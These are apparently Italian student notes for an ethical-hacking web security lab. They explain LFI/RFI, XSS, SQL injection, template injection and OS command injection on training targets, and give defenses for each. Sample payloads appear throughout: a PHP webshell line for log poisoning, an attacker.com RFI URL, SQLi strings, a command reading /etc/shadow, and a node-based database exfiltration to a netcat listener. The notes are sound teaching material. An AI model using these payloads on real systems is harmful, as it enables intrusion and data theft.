# ETHL 0x04 — Web Security p2

> [!abstract] In una frase Il filo conduttore è **uno solo**: input controllato dall'attaccante che finisce dentro un _interprete_ (filesystem, HTML/JS, SQL, motore di template, shell) **senza separazione tra codice e dati**. Da qui nascono **LFI/RFI**, **A05:2025-Injection** e le sue forme — **XSS**, **SQLi**, **SSTi**, **OS Command Injection** — che spesso scalano fino a **RCE**. Poligoni: OWASP Juice Shop e PortSwigger Web Security Academy.

> [!tip] Come usare questa nota Questo è il lab dove il prof scrive nero su bianco (slide 33): _"make sure you understand and explain what you are doing and why it worked/didn't work."_ Quindi per ogni tecnica trovi _cosa fa → perché funziona → come ci si difende_. I payload delle slide sono **riferimento da saper leggere e commentare**, non un kit. Le sfide "manually find …" (slide 25, 32, 37) restano esercizio tuo: do i mattoni concettuali, non la soluzione pronta.

> [!note] Lega col lab precedente Path traversal e file upload li hai già in [[ETHL 0x03 — Web Security p1]]. Qui path traversal ritorna come **caso particolare di LFI**, e il file upload ricompare come _vettore_ per SSTi/RCE. Le shell di [[ETHL 0x02 — Remote Access - Shells]] sono il "dopo" di una RCE.

---

## 0. Il modello mentale dell'injection

> [!info] La regola che spiega tutto il lab (slide 10) Un'app è vulnerabile a injection quando **(1)** incorpora dati forniti dall'utente _direttamente_ in query/comandi dinamici (SQL, script, comandi di sistema, percorsi di file, template) **e (2)** non fa escaping o **handling context-aware**.
> 
> L'errore di fondo è sempre lo stesso: **mescolare codice e dati**. L'interprete a valle (DB, browser, shell, template engine) non sa distinguere la parte "legittima" dalla parte iniettata e le esegue entrambe. La difesa è sempre la stessa idea: **separare** i due (query parametrizzate, output encoding, allowlist, niente costruzione di comandi via stringhe).

Tipi comuni (slide 11): **XSS**, **SQL/NoSQL injection**, **SSTi**, **OS command injection**. [[LFI - Local File Inclusion]]/[[RFI - Remote File Inclusion]] sono cugini: invece di un interprete iniettano un _file_ nel flusso di rendering.

---

## 1. Local File Inclusion (LFI)

> [!abstract] Definizione (slide 5) Ingannare l'app per farle **caricare, renderizzare e possibilmente eseguire** contenuto da una **sorgente locale**. Tipico nei parametri (GET/POST/Cookie) che caricano file legittimi dalla directory dell'app.

Esempi di parametri "innocenti" abusabili:

```
/index.php?lang=/lang/italian.json       (definizioni di lingua)
/product?pic=/assets/flowers.png         (immagine parametrica)
```

> [!info] [[LFI - Local File Inclusion]] vs [[Path Traversal]] La **path traversal** (vista in [[Ethl 0x03 web security p1]]) è un _tipo_ di LFI: usi `../` per leggere file fuori dalla cartella prevista. L'LFI è il concetto più ampio: non solo _leggere_ un file, ma farlo **includere/eseguire** dall'app. Quando il file incluso viene _interpretato_ (es. PHP), si apre la strada alla RCE.

### 1.1 LFI → RCE via Log Poisoning (slide 6)

> [!danger] Il meccanismo — punto d'esame "[[Log poisoning]]" trasforma una semplice lettura di file in **esecuzione di codice**. Catena:
> 
> 1. L'attaccante invia una richiesta HTTP in cui un campo **che lui controlla** (es. l'header **`User-Agent`**) contiene codice, p.es. `<?php system($_GET['c']); ?>`.
> 2. Il web server **scrive quell'header nel log** (es. `/var/log/apache2/access.log`). Il log è ora "avvelenato".
> 3. L'attaccante usa l'LFI per **includere il file di log**: `?page=/var/log/apache2/access.log`.
> 4. Quando l'app include il log come PHP, il payload prima inerte viene **eseguito** → RCE.
> 
> _Perché funziona_: l'app si fida di un file "locale e legittimo" (il log), ma quel file contiene dati **scelti dall'attaccante**, e l'inclusione li tratta come codice. È di nuovo il peccato originale: dati che diventano codice.

> [!success] Difese LFI
> 
> - **Mai** passare input utente direttamente a funzioni di inclusione/lettura file.
> - **Allowlist** di file ammessi (mappa `it → italian.json`), non concatenazione di path.
> - Disabilitare l'esecuzione/inclusione di file dinamici dove non serve; in PHP `allow_url_include=Off`.
> - Canonicalizzare e verificare che il path resti nella directory consentita.

---

## 2. Remote File Inclusion (RFI)

> [!abstract] Definizione (slide 8) Come l'LFI, ma la sorgente è **remota**: l'app include nel rendering **server-side** un contenuto preso da un URL. _"Very similar to LFI, possibly more dangerous."_

> [!warning] Perché [[RFI - Remote File Inclusion]] è più pericolosa dell'LFI Nell'LFI l'attaccante deve **già** riuscire a piazzare il payload da qualche parte sul server (log, upload…). Nell'RFI **controlla interamente la sorgente remota**: punta l'app a `http://attacker.com/shell.txt` e il server scarica ed esegue _qualunque_ codice voglia, senza bisogno di un file locale avvelenato. Un passo in meno per la RCE.
> 
> Mitigazione storica: i linguaggi moderni disabilitano di default l'inclusione da URL (es. PHP `allow_url_include=Off`), per questo l'RFI è meno comune oggi.

Demo del lab: **RFI via selezione della lingua** (il parametro `lang` che invece di un file locale carica un URL remoto).

---

## 3. A05:2025 — Injection (Cross Site Scripting)

### 3.1 Come funziona [[XSS]] (slide 13)

> [!abstract] In sintesi L'attaccante inietta **codice (JavaScript)** in un sito vulnerabile; quando la vittima visita la pagina, il codice **gira nel suo browser**, con accesso a cookie, dati di sessione e capacità di forzare azioni. Tre tipi: **Reflected**, **Stored**, **DOM-based**.

> [!info] Il punto chiave di XSS XSS viola la fiducia _del browser nel sito_: il browser esegue tutto il JS che "sembra" provenire dal sito. Se l'attaccante riesce a far servire il suo JS dal dominio vittima, quel JS eredita i privilegi della pagina (stessa origine, stessi cookie). Per questo XSS è essenzialmente **esecuzione di codice arbitrario nel contesto della vittima**.

### 3.2 I tre tipi

|Tipo|Dove vive il payload|Trigger|Gravità|
|---|---|---|---|
|**Reflected** (1/3)|nell'URL/form, "rimbalzato" nella risposta|la vittima apre il link/invia il form|media — serve ingannare la vittima|
|**Stored** (2/3)|**salvato sul server** (commento, post, profilo)|ogni volta che _chiunque_ carica la pagina|**la più grave** — colpisce tutti, senza azione della vittima|
|**DOM-based** (3/3)|manipolazione del **DOM lato client**|interazione specifica (click, modifica form, JS)|qualificatore aggiuntivo di reflected/stored|

> [!info] Distinzioni da non sbagliare (trappola d'esame)
> 
> - **Reflected**: il payload fa un viaggio andata-ritorno _in una singola richiesta_; non viene memorizzato. `?search=<script>alert(1)</script>` rimbalza in "0 results for …".![[Pasted image 20260603145158.png]]
> - **Stored è la più severa** perché il payload è persistente sul server e si esegue per **ogni** utente che vede la pagina, _a prescindere dalle sue azioni_. Demo: commento con `<script>alert(1)</script>`.![[Pasted image 20260603145214.png]]
> - **DOM-based** non è una "terza posizione": è una _qualificazione_. Il difetto sta nel **JavaScript client-side** che prende dati controllabili (es. `location.hash`) e li scrive nel DOM in modo non sicuro. Il payload può non toccare mai il server. Demo: `"><svg onload=alert(1)>` che finisce in un attributo `src`.![[Pasted image 20260603145241.png]]

### 3.3 XSS e CSRF (slide 14)

> [!note] Relazione (CSRF non si fa in questo lab) XSS può far emettere al browser richieste **verso altri siti** dove l'utente è _già autenticato_ → **CSRF** (Cross-Site Request Forgery). XSS "ruba" l'esecuzione; CSRF "ruba" l'autenticazione implicita (cookie inviati automaticamente). Il lab rimanda a PortSwigger per provare CSRF.

### 3.4 "Is XSS a big deal?" (slide 21–23)

> [!warning] Sì. Impatto reale "Stiamo solo eseguendo JS arbitrario nel browser della vittima"… che è enorme:
> 
> - **Furto di informazioni sensibili**: cookie, token di sessione, dati nel browser.
> - **Session hijacking**: impersonare l'utente, accedere ad account/sistemi — direttamente (rubando il materiale di sessione) o via CSRF.
> - **Defacement**: alterare aspetto e contenuti del sito.
> - Trampolino per attacchi più sofisticati: distribuzione malware, phishing.

> [!example] Demo: XSS-Exploitation-Tool (slide 22) Strumento che, dato un XSS, automatizza la raccolta di informazioni dal browser della vittima (cookie, screenshot, keylog…). Concettualmente: dimostra _quanto in là_ si arriva una volta che giri JS nella pagina vittima.

### 3.5 Mitigazioni XSS (slide 24)

> [!success]
> 
> - **Input validation server-side**: sanificare l'input _prima_ di salvarlo.
> - **Output encoding**: cruciale per lo **Stored XSS** — codificare i dati non fidati al momento di _mostrarli_, così `<script>` diventa testo inerte (`&lt;script&gt;`) invece che codice. È la difesa più importante: si neutralizza al punto di output, nel contesto giusto (HTML, attributo, JS, URL).
> - **DOM-based**: secure coding lato client — evitare `innerHTML`/`eval` con dati controllabili; usare API sicure (`textContent`, sanitizer).
> - Difesa in profondità: **Content-Security-Policy**, cookie `HttpOnly` (il JS non legge il cookie di sessione), `SameSite`.

> [!todo] Challenge (slide 25) _Trova manualmente un XSS in Juice Shop._ Suggerimento concettuale: cerca punti dove un tuo input viene **riflesso o memorizzato** e poi mostrato senza encoding (campo di ricerca, nome utente/profilo, recensioni). Prova prima un marcatore innocuo per capire _dove_ e _in che contesto_ finisce, poi ragiona sull'encoding mancante.

---

## 4. SQL Injection (SQLi)

### 4.1 Come funziona e impatto (slide 27)

> [!abstract] Iniettare codice SQL malevolo sfruttando query costruite per concatenazione. Impatto: **leggere dati nascosti**, **sovvertire la logica applicativa** (es. bypass login), **leggere dati fuori scope**, e in certi casi **eseguire codice sull'OS**.

### 4.2 Il difetto base — WHERE clause (slide 28)

```php
$query = "SELECT * FROM products WHERE category = '" . $c . "'";
//                                                ^ input utente concatenato
```

Con `category=Pets` la query è benigna. Ma `$c` è sotto controllo dell'attaccante: chiudendo l'apice e aggiungendo SQL, si altera la struttura della query.
![[Pasted image 20260603163531.png]]

> [!info] Perché funziona L'apice `'` dell'attaccante **chiude** la stringa prevista; ciò che segue viene letto come **SQL, non come dato**. Es. `' OR '1'='1` rende la condizione sempre vera. È identico nello spirito all'OS command injection (sotto): si "esce" dal contesto-dato e si entra nel contesto-codice.

### 4.3 Rilevare il DBMS via UNION (slide 29)

> [!info] L'idea di UNION-based SQLi `UNION SELECT` accoda i risultati di una seconda query alla prima. Se l'output è visibile, si può estrarre informazione (es. la versione). Vincolo: la `SELECT` iniettata deve avere lo **stesso numero di colonne** (e tipi compatibili) della originale — per questo nei payload reali compaiono tanti `null`/`0` di riempimento.

|DBMS|Funzione versione|Payload tipo|
|---|---|---|
|MySQL / MS SQL|`@@version`|`' UNION SELECT @@version --`|
|Oracle|`version FROM v$instance`|`' UNION SELECT version FROM v$instance --`|
|PostgreSQL|`version()`|`' UNION SELECT version() --`|

Esempio dalle slide (PostgreSQL, 8 colonne):

```
/filter?category=x'+union+select+0,null,version(),0,0,'',null,null-- 
```

> Il `--` commenta il resto della query originale (l'apice di chiusura che altrimenti romperebbe la sintassi).

Approdonfiamo
#### La situazione normale

L'app fa questa query per mostrarti i prodotti:

```sql
SELECT nome, prezzo FROM prodotti WHERE categoria='Pets'
```

Il risultato è una tabella con due colonne che vedi nella pagina:

```
nome          prezzo
-----------   ------
Cibo gatto    5.99
Lettiera      12.00
```

---

#### Cosa fa UNION

`UNION` in SQL **incolla i risultati di due SELECT** una sotto l'altra:

```sql
SELECT nome, prezzo FROM prodotti WHERE categoria='Pets'
UNION
SELECT 'ciao', 'mondo'
```

Risultato:

```
nome          prezzo
-----------   ------
Cibo gatto    5.99
Lettiera      12.00
ciao          mondo   ← riga aggiunta dalla seconda SELECT
```

---

#### L'attacco

Il parametro `categoria` lo controlli tu. Invece di `Pets` metti:

```
x' UNION SELECT 'ciao','mondo' --
```

La query diventa:

```sql
SELECT nome, prezzo FROM prodotti WHERE categoria='x'
UNION
SELECT 'ciao','mondo'
--'
```

- `x` non esiste → la prima SELECT restituisce zero righe
- `--` commenta l'apice finale che romperebbe la sintassi
- la seconda SELECT restituisce `ciao` e `mondo`
- la pagina mostra `ciao` e `mondo` come se fossero prodotti normali

Ora invece di `'mondo'` metti `version()`:

```
x' UNION SELECT 'db_version', version() --
```

La pagina ti mostra la versione del database come se fosse un prodotto. **Hai estratto informazioni interne attraverso l'output normale della pagina.**

---
#### Il vincolo del numero di colonne

`UNION` richiede che le due SELECT abbiano **lo stesso numero di colonne**. Se la query originale ne ha 8 e tu ne metti 2, il database restituisce errore.

Per questo si "riempie" con `null` o `0`:

```sql
-- query originale ha 8 colonne, version() la vuoi nella terza
x' UNION SELECT 0,null,version(),0,0,'',null,null --
```

Per scoprire quante colonne ha la query originale si prova ad aggiungere `null` uno alla volta finché non smette di dare errore.
##Ricognizione del Database (Scoprire i Metadati)

Come fa un attaccante a sapere che la tabella si chiama `users` o che le colonne sono `user` e `password`? Può eseguire una ricognizione _interrogando i metadati stessi del database_.

La maggior parte dei database SQL mantiene un database speciale e integrato che descrive tutti gli altri database, tabelle e colonne.

- **information_schema** (per MySQL, PostgreSQL, ecc.)
    
    Questo è un database standard che può essere interrogato come qualsiasi altro.
    
    - Per trovare tutti i nomi delle tabelle:
        
        `...UNION SELECT table_name, table_schema FROM information_schema.tables -- -`
        
    - Per trovare tutti i nomi delle colonne di una tabella specifica:
        
        `...UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' -- -`
        
- **sqlite_master** (per SQLite)
    
    SQLite usa una tabella master speciale.
    
    - Per trovare tutte le tabelle:
        
        `...UNION SELECT name, tbl_name FROM sqlite_master WHERE type='table' -- -`
        

Utilizzando queste tabelle di metadati, un attaccante può mappare alla cieca l'intera struttura del database, trovare tabelle sensibili (`users`, `credit_cards`) e quindi lanciare un attacco `UNION` per estrarne il contenuto.

---

> **In sintesi**: UNION-based SQLi = **aggiungo una mia SELECT alla query originale per far sì che il database mi mostri dati interni (versione, utenti, hash) nell'output normale della pagina**, fingendo che siano dati legittimi.


### 4.4 Blind SQLi e Time-based (slide 30)

> [!info] Quando l'output non si vede Nella **Blind SQLi** non vedi il risultato della query iniettata (caso comune). Si **inferisce** un bit alla volta osservando se la pagina si comporta come atteso (true/false). Estrazione carattere per carattere con `SUBSTR`:
> 
> ```
> ... AND (SELECT SUBSTR((SELECT version()),1,1))='P'-- 
> ... AND (SELECT SUBSTR((SELECT version()),2,1))='o'-- 
> ```
> 
> **Time-based**: quando neppure il comportamento cambia, si usa il **tempo** come canale. Si forza un `sleep` solo se la condizione è vera:
> 
> ```
> ...; SELECT CASE WHEN SUBSTR((SELECT version()),1,1)='P'
>       THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
> ```
> 
> Se la risposta tarda 5s → il carattere era 'P'. Lento ma funziona anche "alla cieca". Concetto chiave: **canale laterale** (timing) per esfiltrare dati un bit alla volta.

### 4.5 Second-Order (Stored) SQLi (slide 31)

> [!info] L'app prende l'input da una richiesta e lo **memorizza**; l'injection scatta **più tardi**, quando quel dato salvato viene usato in un'altra query senza essere ri-sanificato. Analogo concettuale dello Stored XSS: il payload "dorme" e si attiva in un secondo momento, spesso in un contesto diverso da dove è entrato → difficile da individuare.

### 4.6 sqlmap (slide 33)

> [!warning] "Understand and explain why it worked/didn't work" Questa slide è **letteralmente** l'istruzione d'esame. `sqlmap` automatizza rilevamento ed exploit della SQLi:
> ![[Pasted image 20260603165625.png]]
> 
> ```
> sqlmap -u "https://<target>/filter?category=Pets" --method GET
> ```
> 
> Dall'output del lab impari a _leggere_ cosa fa: rileva che il parametro `category` è dinamico, prova boolean-based blind (WHERE/HAVING), riconosce il backend (**PostgreSQL**), poi testa error-based, stacked queries, time-based, UNION… **All'esame conta spiegare**: quale tecnica ha funzionato e _perché_ (es. "time-based blind perché l'output non era riflesso ma il parametro influenzava il tempo di risposta"), non lanciare il tool a memoria.

> [!success] Difese SQLi
> 
> - **Prepared statements / query parametrizzate**: i dati non vengono mai interpretati come SQL. È _la_ difesa.
> - ORM usati correttamente, escaping context-aware come ripiego.
> - Privilegi minimi sul DB, niente account onnipotenti per l'app.
> - Disattivare messaggi d'errore verbosi (riduce error-based).

> [!todo] Practice (slide 32) _Trova manualmente una SQLi in Juice Shop._ Suggerimento: il login è il sospetto classico — pensa a cosa succede a una query `WHERE email='<input>'` se l'input chiude l'apice e commenta il resto. Verifica _perché_ il comportamento cambia.

---

## 5. Server-Side Template Injection (SSTi)

### 5.1 Cosa sono i template (slide 35)
![[Pasted image 20260603172633.png]]![[Pasted image 20260603172645.png]]

> [!abstract] Le web app usano **template** per separare struttura/presentazione dalla logica (es. **Pug** per Node.js, **Jinja** per Python). I marcatori tipo `{{ ... }}` (Jinja) o `#{ ... }` (Pug) eseguono codice del linguaggio. L'SSTi nasce quando l'app **renderizza contenuto utente come parte del template** invece che come semplice dato.

### 5.2 Perché è grave (slide 36)

> [!danger] Poiché i template tipicamente permettono di **eseguire codice nativo** del linguaggio, l'SSTi **di solito porta a RCE**. Anche senza RCE l'impatto è severo: **information disclosure** (leggere file, esfiltrare dati), **DoS**, **defacement**.

### 5.3 Rilevare ed exploitare su Juice Shop (slide 38–39)

> [!info] Come si scopre il motore di template — punto d'esame Si inietta un'**espressione matematica** nel marcatore sospetto e si guarda se viene _valutata_. Sul campo _Username_ del profilo Juice Shop:
> 
> - `Admin #{1+1}` → se compare `Admin 2`, il `#{}` è stato **eseguito** → è **Pug** (sintassi `#{}`). Se avesse risposto a `{{7*7}}` con `49` sarebbe stato Jinja-like.
> 
> Il ragionamento: si parte dalle sintassi dei motori popolari per quello stack (NodeJS → Pug/Handlebars/EJS…) e si prova quella che "valuta" l'espressione. Confermato Pug, si può eseguire JavaScript: es. `#{req.cookies['token']}` per leggere il proprio token (prova che si gira codice server-side).

### 5.4 SSTi → esfiltrazione in ambiente distroless (slide 40–42)

> [!info] La complicazione "distroless" (LoTL) — concetto importante Con Docker, Juice Shop gira su `gcr.io/distroless/nodejs20-debian12`: **nessuna shell** (`/bin/sh` assente). Una reverse shell classica (vedi [[Ethl 0x02 remote access]]) non parte: non c'è interprete di comandi. Due strategie:
> 
> 1. **Caricare binari statici** via file-upload vuln ed eseguirli.
> 2. **Living off the Land (LoTL)**: usare ciò che _c'è già_ — il binario **`node`** stesso. Non serve una shell: `node -e` esegue JavaScript, e da JS si fa networking e file I/O.
> 
> _Perché è didatticamente interessante_: ti costringe a capire che "RCE" non significa "ho una shell". Significa "eseguo codice"; con quale strumento dipende da cosa è disponibile sul target. Distroless alza l'asticella ma non chiude la porta.

> [!example] L'exfil del DB (slide 41–42) — da leggere e spiegare, non da eseguire alla cieca
> 
> 1. **Listener** sull'attack box che salva ciò che riceve: `nc -l 4444 > jsdb.sqlite`.
> 2. Capire **quale IP** il container raggiunge: con Docker **non** è `localhost` (namespace di rete separati) → si usa l'IP della rete interna/host.
> 3. Iniettare nel campo Pug (`#{}`) del profilo del JavaScript che, **usando il binario `node` già presente** (LoTL), apre una connessione TCP verso l'attack box e vi riversa il file `juiceshop.sqlite`. Schema concettuale: `child_process.spawnSync('/nodejs/bin/node', ['-e', <script>])` dove lo script crea un `net.createConnection({host:<ip attaccante>, port:4444})` e fa `fs.createReadStream('…/juiceshop.sqlite').pipe(connessione)`.
> 
> _Perché funziona_: il template valuta `#{}` lato server con i privilegi del processo Node; da lì si accede al filesystem e alla rete del container. Il DB SQLite (utenti, hash, token…) esce in chiaro verso l'attaccante. È SSTi → **information disclosure totale**, senza nemmeno bisogno di una shell.

> [!success] Difese SSTi
> 
> - **Non** passare mai input utente come _parte_ del template; passarlo solo come **dato** (contesto variabile), non come sorgente del template.
> - Motori in modalità **sandbox**/logic-less (es. Mustache) dove possibile.
> - Validazione/allowlist dei valori; isolare il rendering (container con privilegi minimi, niente `child_process`).

---

## 6. OS Command Injection

### 6.1 Cos'è (slide 44)

> [!abstract] La forma **più diretta di RCE**: il sistema costruisce in modo insicuro una **riga di comando** con input utente. Esempi classici: un _network looking glass_ su internet, lo script di configurazione del firewall di un router SOHO — posti dove l'app "wrappa" un comando di sistema attorno a un parametro.

### 6.2 Come si rileva/exploita (slide 45)

> [!info] Stesso principio della SQLi — punto d'esame Si **"termina"** il comando previsto e si aggiunge il proprio. Se il codice fa:
> 
> ```
> nmap -sS ${TARGET_IP} -oX
> ```
> 
> e l'attaccante mette in `TARGET_IP`:
> 
> ```
> localhost;cat /etc/shadow; #
> ```
> 
> il comando eseguito diventa:
> 
> ```
> nmap -sS localhost;cat /etc/shadow; # -oX
> ```
> 
> _Perché funziona_: il `;` separa due comandi shell → `cat /etc/shadow` gira come secondo comando; il `#` **commenta** il resto (`-oX`) così la sintassi non si rompe. Identico allo schema SQLi (`'…--`) e SSTi: uscire dal contesto-dato, entrare nel contesto-codice, neutralizzare la coda. Metacaratteri utili nello stesso spirito: `;`, `|`, `&&`, `` ` ` ``, `$(...)`.

> [!example] Hands-on (slide 46) Su PortSwigger, un endpoint `stock` che accetta `productId`/`storeId` e li passa a un comando: iniettando `;cat /proc/self/environ` si legge l'ambiente del processo (variabili, path, a volte segreti). Conferma la RCE.

> [!success] Difese OS Command Injection
> 
> - **Non costruire comandi via stringhe.** Usare API che separano programma e argomenti (es. `execFile`/`spawn` con array di argomenti, _senza_ shell).
> - Allowlist rigorosa dei valori ammessi; mai metacaratteri shell nell'input.
> - Privilegi minimi del processo; evitare del tutto la chiamata alla shell quando possibile.

---

## 7. Trappole d'esame

> [!danger] Le domande "spiega questo / perché ha funzionato" tipiche del lab
> 
> 1. **LFI vs path traversal vs RFI** → path traversal è un tipo di LFI (sorgente locale); RFI usa sorgente _remota_ ed è più pericolosa perché l'attaccante controlla tutto il contenuto incluso.
> 2. **Log poisoning: la catena** → input controllato (User-Agent) → scritto nel log → log incluso via LFI → eseguito come codice → RCE. Sapere _dove_ entra il payload e _quando_ diventa codice.
> 3. **I tre XSS e quale è più grave** → Stored, perché persistente e colpisce ogni visitatore senza azione della vittima. DOM-based = qualificazione (difetto nel JS client), non una terza "posizione".
> 4. **Reflected vs Stored** → andata-ritorno in una richiesta vs memorizzato sul server.
> 5. **Perché output encoding batte input filtering per lo Stored XSS** → si neutralizza al punto di output, nel contesto giusto; l'encoding rende il payload testo inerte.
> 6. **SQLi WHERE: perché `'` rompe tutto** → chiude la stringa-dato; il resto è letto come SQL. `--` commenta la coda.
> 7. **UNION-based: il vincolo** → stessa quantità (e tipi) di colonne della query originale → da qui i `null`/`0` di padding.
> 8. **Blind vs Time-based** → output non visibile → si infiriscono i bit dal comportamento (boolean) o dal **tempo** (`pg_sleep`) come canale laterale.
> 9. **Second-order SQLi** → payload memorizzato che scatta dopo, in una query successiva (analogo Stored XSS).
> 10. **sqlmap: quale tecnica e perché** (slide 33) → saper leggere l'output e motivare (es. "time-based blind perché il parametro influenzava solo il tempo di risposta").
> 11. **SSTi: come si scopre il motore** → iniettare un'espressione (`#{1+1}` → `2` ⇒ Pug; `{{7*7}}` → `49` ⇒ Jinja-like) e vedere se viene _valutata_.
> 12. **SSTi distroless / LoTL** → RCE ≠ avere una shell; senza `/bin/sh` si usa il binario `node` già presente per fare networking + file I/O.
> 13. **OS command injection: il pattern** → `;<comando>; #` termina il comando previsto, esegue il proprio, commenta la coda. Stesso spirito di SQLi/SSTi.
> 14. **Il filo conduttore** → tutte queste vulnerabilità = dati controllati dall'utente trattati come codice da un interprete; difesa = separare codice e dati.

---

## 8. Tabella riassuntiva: vettore → impatto → difesa

|Vulnerabilità|Interprete colpito|Impatto tipico|Difesa chiave|
|---|---|---|---|
|LFI / Path traversal|file system + include|lettura file, **RCE** (log poisoning)|allowlist file, niente input in include|
|RFI|include remoto|**RCE** diretta|`allow_url_include=Off`, allowlist|
|XSS (R/S/DOM)|browser (HTML/JS)|furto sessione, hijack, defacement|**output encoding** contestuale, CSP, HttpOnly|
|SQLi|DBMS|esfiltrazione dati, bypass logica, OS exec|**query parametrizzate**, privilegi minimi|
|SSTi|template engine|**RCE**, info disclosure|input come dato non come template, sandbox|
|OS Command Injection|shell|**RCE** diretta|niente comandi da stringhe, `spawn` con array|

---

## 9. Richiamo attivo (a libro chiuso)

> [!question] Verifica
> 
> 1. Qual è il peccato originale comune a XSS, SQLi, SSTi e command injection?
> 2. Spiega la catena completa di un LFI→RCE via log poisoning.
> 3. Perché l'RFI è considerata più pericolosa dell'LFI?
> 4. Reflected, Stored, DOM-based: definisci ciascuno in una frase e di' quale è più grave e perché.
> 5. Perché l'output encoding è la difesa giusta per lo Stored XSS, e perché va fatto "nel contesto"?
> 6. Dato `WHERE category='$c'`, mostra come `$c` può alterare la struttura della query e cosa fa il `--` finale.
> 7. Qual è il vincolo di una UNION-based SQLi e come lo si soddisfa?
> 8. Quando useresti una time-based blind SQLi invece di una boolean-based?
> 9. Come capisci che un campo è SSTi e che motore usa? Fai l'esempio Pug.
> 10. In ambiente distroless senza shell, come ottieni comunque esecuzione/esfiltrazione? (collega a [[Ethl 0x02 remote access]])
> 11. Scrivi a parole come si inietta un comando OS dato `nmap -sS ${IP} -oX`.

---

> [!quote] Filo conduttore (stesso del lab precedente, più forte) Ogni vulnerabilità di questo lab è la stessa frase ripetuta su interpreti diversi: **dati controllati dall'utente che un interprete tratta come codice perché codice e dati non sono separati.** Cambia l'interprete (browser, SQL, template, shell, include di file), non il principio. E la difesa è sempre la stessa idea: **separare codice e dati**, validare in ingresso, codificare in uscita, usare API parametrizzate.